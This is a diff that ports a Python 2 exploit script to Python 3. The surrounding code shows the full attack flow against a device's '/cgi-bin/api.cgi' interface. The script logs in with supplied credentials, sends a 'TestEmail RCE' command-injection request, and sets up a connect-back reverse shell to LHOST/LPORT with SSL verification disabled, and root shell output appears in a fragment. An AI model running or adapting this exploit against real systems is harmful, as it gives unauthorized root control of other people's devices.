@@ -42,6 +42,7 @@ uid=0(root) gid=0(root)
 exit
 $
 """
+from __future__ import print_function
 import socket
 import sys
 import urllib, urllib2, httplib
@@ -75,17 +76,17 @@ class HTTPconnect:
 		url = '{}://{}{}'.format(self.proto, self.host, self.uri)
 
 		if self.verbose:
-			print "[Verbose] Sending:", url
+			print("[Verbose] Sending:", url)
 
 		if self.proto == 'https':
 			if hasattr(ssl, '_create_unverified_context'):
-				print "[i] Creating SSL Unverified Context"
+				print("[i] Creating SSL Unverified Context")
 				ssl._create_default_https_context = ssl._create_unverified_context
 
 		if self.credentials:
 			Basic_Auth = self.credentials.split(':')
 			if self.verbose:
-				print "[Verbose] User:",Basic_Auth[0],"Password:",Basic_Auth[1]
+				print("[Verbose] User:",Basic_Auth[0],"Password:",Basic_Auth[1])
 			try:
 				pwd_mgr = urllib2.HTTPPasswordMgrWithDefaultRealm()
 				pwd_mgr.add_password(None, url, Basic_Auth[0], Basic_Auth[1])
@@ -93,11 +94,11 @@ class HTTPconnect:
 				opener = urllib2.build_opener(auth_handler)
 				urllib2.install_opener(opener)
 			except Exception as e:
-				print "[!] Basic Auth Error:",e
+				print("[!] Basic Auth Error:",e)
 				sys.exit(1)
 
 		if self.noexploit and not self.verbose:
-			print "[<] 204 Not Sending!"
+			print("[<] 204 Not Sending!")
 			html =  "Not sending any data"
 			return html
 		else:
@@ -108,7 +109,7 @@ class HTTPconnect:
 			try:
 				rsp = urllib2.urlopen(req)
 			except Exception as e:
-				print "[<] {}".format(str(e))
+				print("[<] {}".format(str(e)))
 				return False
 
 		if self.Raw:
@@ -210,10 +211,10 @@ if __name__ == "__main__":
 		arg_parser.add_argument('-v','--verbose', required=False, default=False, action='store_true', help='Verbose mode [Default: False]')
 		args = arg_parser.parse_args()
 	except Exception as e:
-		print INFO,"\nError: {}\n".format(str(e))
+		print(INFO,"\nError: {}\n".format(str(e)))
 		sys.exit(1)
 
-	print INFO
+	print(INFO)
 
 	if args.verbose:
 		verbose = True
@@ -235,33 +236,33 @@ if __name__ == "__main__":
 
 	# Check if RPORT is valid
 	if not Validate(verbose).Port(rport):
-		print "[!] Invalid RPORT - Choose between 1 and 65535"
+		print("[!] Invalid RPORT - Choose between 1 and 65535")
 		sys.exit(1)
 
 	# Check if LPORT is valid
 	if not Validate(verbose).Port(lport):
-		print "[!] Invalid LPORT - Choose between 1 and 65535"
+		print("[!] Invalid LPORT - Choose between 1 and 65535")
 		sys.exit(1)
 
 	# Check if RHOST is valid IP or FQDN, get IP back
 	rhost = Validate(verbose).Host(rhost)
 	if not rhost:
-		print "[!] Invalid RHOST"
+		print("[!] Invalid RHOST")
 		sys.exit(1)
 
 	# Check if LHOST is valid IP or FQDN, get IP back
 	lhost = Validate(verbose).Host(lhost)
 	if not lhost:
-		print "[!] Invalid LHOST"
+		print("[!] Invalid LHOST")
 		sys.exit(1)
 
 #
 # Validation done, start print out stuff to the user
 #
-	print "[i] Remote target IP:",rhost
-	print "[i] Remote target PORT:",rport
-	print "[i] Connect back IP:",lhost
-	print "[i] Connect back PORT:",lport
+	print("[i] Remote target IP:",rhost)
+	print("[i] Remote target PORT:",rport)
+	print("[i] Connect back IP:",lhost)
+	print("[i] Connect back PORT:",lport)
 
 	remote_host = rhost+':'+rport
 
@@ -313,82 +314,82 @@ if __name__ == "__main__":
 	#
 	# Login
 	#
-	print "[>] Sending: Login, Creds: {}".format(credentials)
+	print("[>] Sending: Login, Creds: {}".format(credentials))
 	URI = '/cgi-bin/api.cgi?cmd=Login&token=null'
 	response = HTTPconnect(remote_host,proto,verbose,credentials,False,noexploit).Send(URI,headers,json.dumps(LOGIN),None)
 	if response:
 		JSON = json.loads(response)
 		if verbose:
-			print json.dumps(JSON,indent=4)
+			print(json.dumps(JSON,indent=4))
 
 		if JSON[0]['code'] != 0:
-			print "[<] cmd: {}, error: {}".format(JSON[0]['cmd'],JSON[0]['error']['detail'])
-			print "[!] Exit"
+			print("[<] cmd: {}, error: {}".format(JSON[0]['cmd'],JSON[0]['error']['detail']))
+			print("[!] Exit")
 			sys.exit(1)
 	else:
-		print response
+		print(response)
 		sys.exit(1)
 	token = JSON[0]['value']['Token']['name']
-	print "[<] cmd: {}, token: {}".format(JSON[0]['cmd'],token)
+	print("[<] cmd: {}, token: {}".format(JSON[0]['cmd'],token))
 
 	#
 	# RCE
 	#
-	print "[>] Sending: TestEmail RCE"
+	print("[>] Sending: TestEmail RCE")
 	URI = '/cgi-bin/api.cgi?cmd=TestEmail&file=config-file&token=' + token
 	response = HTTPconnect(remote_host,proto,verbose,credentials,False,noexploit).Send(URI,headers,json.dumps(RCE),None)
 	if response:
 		JSON = json.loads(response)
 		if verbose:
-			print json.dumps(JSON,indent=4)
+			print(json.dumps(JSON,indent=4))
 
 		if JSON[0]['code'] != 0:
-			print "[<] cmd: {}, error: {}".format(JSON[0]['cmd'],JSON[0]['error']['detail'])
-			print "[>] Sending: Logout"
+			print("[<] cmd: {}, error: {}".format(JSON[0]['cmd'],JSON[0]['error']['detail']))
+			print("[>] Sending: Logout")
 			URI = '/cgi-bin/api.cgi?cmd=Logout&token=' + token
 			response = HTTPconnect(remote_host,proto,verbose,credentials,False,noexploit).Send(URI,headers,json.dumps(LOGOUT),None)
 			if response:
 				JSON = json.loads(response)
 				if verbose:
-					print json.dumps(JSON,indent=4)
+					print(json.dumps(JSON,indent=4))
 
 				if JSON[0]['code'] != 0:
-					print "[<] cmd: {}, error: {}".format(JSON[0]['cmd'],JSON[0]['error']['detail'])
-					print "[!] Exit"
+					print("[<] cmd: {}, error: {}".format(JSON[0]['cmd'],JSON[0]['error']['detail']))
+					print("[!] Exit")
 					sys.exit(1)
 			else:
-				print response
+				print(response)
 				sys.exit(1)
-			print "[<] cmd: {}, result: {}".format(JSON[0]['cmd'],JSON[0]['value']['rspCode'])
+			print("[<] cmd: {}, result: {}".format(JSON[0]['cmd'],JSON[0]['value']['rspCode']))
 
-			print "[!] Exit"
+			print("[!] Exit")
 			sys.exit(1)
 	else:
-		print response
+		print(response)
 		sys.exit(1)
-	print "[<] cmd: {}, result: {}".format(JSON[0]['cmd'],JSON[0]['value']['rspCode'])
+	print("[<] cmd: {}, result: {}".format(JSON[0]['cmd'],JSON[0]['value']['rspCode']))
 
 	#
 	# Logout
 	#
-	print "[>] Sending: Logout"
+	print("[>] Sending: Logout")
 	URI = '/cgi-bin/api.cgi?cmd=Logout&token=' + token
 	response = HTTPconnect(remote_host,proto,verbose,credentials,False,noexploit).Send(URI,headers,json.dumps(LOGOUT),None)
 	if response:
 		JSON = json.loads(response)
 		if verbose:
-			print json.dumps(JSON,indent=4)
+			print(json.dumps(JSON,indent=4))
 
 		if JSON[0]['code'] != 0:
-			print "[<] cmd: {}, error: {}".format(JSON[0]['cmd'],JSON[0]['error']['detail'])
-			print "[!] Exit"
+			print("[<] cmd: {}, error: {}".format(JSON[0]['cmd'],JSON[0]['error']['detail']))
+			print("[!] Exit")
 			sys.exit(1)
 	else:
-		print response
+		print(response)
 		sys.exit(1)
-	print "[<] cmd: {}, result: {}".format(JSON[0]['cmd'],JSON[0]['value']['rspCode'])
+	print("[<] cmd: {}, result: {}".format(JSON[0]['cmd'],JSON[0]['value']['rspCode']))
 
-	print "[i] All done"
+	print("[i] All done")
 
 # [EOF]
 
